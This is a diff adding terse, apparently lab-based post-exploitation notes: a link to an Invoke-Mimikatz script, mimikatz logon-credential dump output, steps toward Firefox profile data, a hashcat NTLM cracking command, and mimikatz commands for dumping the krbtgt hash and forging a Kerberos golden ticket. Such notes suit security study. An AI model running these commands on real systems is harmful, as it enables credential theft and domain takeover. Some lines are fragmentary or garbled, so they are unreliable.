@@ -131,3 +131,121 @@ for cve
 we can get into administrator a command line
 
 
+# trying mimikatz
+
+mimi 2.2 : https://raw.githubusercontent.com/g4uss47/Invoke-Mimikatz/master/Invoke-Mimikatz.ps1
+
+the result :
+
+```
+Authentication Id : 0 ; 52106 (00000000:0000cb8a)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 8/2/2022 11:29:39 PM
+SID               : S-1-5-96-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-ATB3U19$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+	cloudap :	KO
+
+Authentication Id : 0 ; 52107 (00000000:0000cb8b)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 8/2/2022 11:29:39 PM
+SID               : S-1-5-96-0-0
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-ATB3U19$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+	cloudap :	KO
+
+Authentication Id : 0 ; 50629 (00000000:0000c5c5)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 8/2/2022 11:29:37 PM
+SID               : 
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+	cloudap :	KO
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DESKTOP-ATB3U19$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 8/2/2022 11:29:37 PM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-ATB3U19$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : desktop-atb3u19$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	
+	credman :	
+	cloudap :	KO
+
+mimikatz(powershell) # exit
+Bye!
+
+```
+
+2.1 mimi here : https://github.com/EmpireProject/Empire/commit/7efb7eeaabeb3daf916ead7856bb621bbca331f4
+
+mimkatz video : https://www.youtube.com/watch?v=0OxhLjEZa3Y
+
+`Find-Module "*SQL*"`
+
+`PSSQLite` 
+
+`install-module -Name PSSQLite`
+
+`import-module PSSQLite`
+
+`cd AppData\Roaming\MOzilla`
+
+Post exploitation room intryhackme
+
+understanding mimkatz: https://www.youtube.com/watch?v=AZirvtZNIEw
+
+lsa and sha1 hashes were got
+lsadump::lsa \pathc
+
+`hashcat -m 1000 <hash> /usr/share/wordlists/rockyou.txt`
+
+### Golden ticket attack with mimikatz
+
+Kerberos ticket granting ticket account has to get his hashes dump
+
+`lsadump::lsa /inject /name:krbtgt`
+
+`kerberos::golden /user: /domain: /sid: /krbtgt: /id:`
+
+
+
+
